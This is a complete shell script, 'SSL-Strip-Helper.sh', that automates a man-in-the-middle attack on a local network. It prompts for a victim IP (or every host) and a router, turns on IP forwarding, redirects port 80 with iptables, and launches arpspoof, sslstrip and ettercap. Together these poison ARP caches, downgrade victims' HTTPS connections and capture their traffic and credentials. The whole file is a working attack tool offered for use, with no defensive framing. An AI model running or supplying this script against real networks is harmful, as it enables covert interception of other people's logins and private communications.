#!/bin/sh

#  SSL-Strip-Helper.sh
#  SSL-Strip-Helper
#
#  Created by kostas vaggelakos on 8/26/11.
#  Copyright 2011. All rights reserved.

trap bashtrap INT

function run() {
    # Get the user to chose target
    echo -e "Ip of the taget, if all wanted type ALL, [192.168.0.187]: \c"
    read
    TARGET=$REPLY
    if [ "$TARGET" == "ALL" ]; then
        echo "Chose everyone as a target!"
    fi
    # Get the user to enter the router address
    echo -e "Ip of the router [192.168.0.1]: \c"
    read
    ROUTER=$REPLY
    #Get the user to chose on what interface they want to work
    echo -e "Interface you want to use [eth0]: \c"
    read
    INTERFACE=$REPLY
    #Set default values if not entered
    : ${TARGET:="192.168.0.187"} 
    : ${ROUTER:="192.168.0.1"} 
    : ${INTERFACE:="eth0"} 

    # IP_FORWARD
    echo 1 > /proc/sys/net/ipv4/ip_forward
    #Redirect port 80 traffic to port 10000
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

    # Run arpspoof in separate window
    if [ "$TARGET" == "ALL" ]; then
        command="arpspoof -i $INTERFACE $ROUTER"
    else
        command="arpspoof -i $INTERFACE -t $TARGET $ROUTER"
    fi
    xterm -T "ArpSpoofing $TARGET" -geometry 100x15 -e $command &

    # Strip that SSL! (in different window)
    command="sslstrip -a -k -f"
    xterm -T "SSLStrip" -geometry 100x15 -e $command &

    # Sniff the trafic and show it in the console
    ettercap -T -q -i $INTERFACE
}

bashtrap() {
    echo $'\nCTRL-C detected, closing...'
    echo 0 > /proc/sys/net/ipv4/ip_forward
    exit
}

run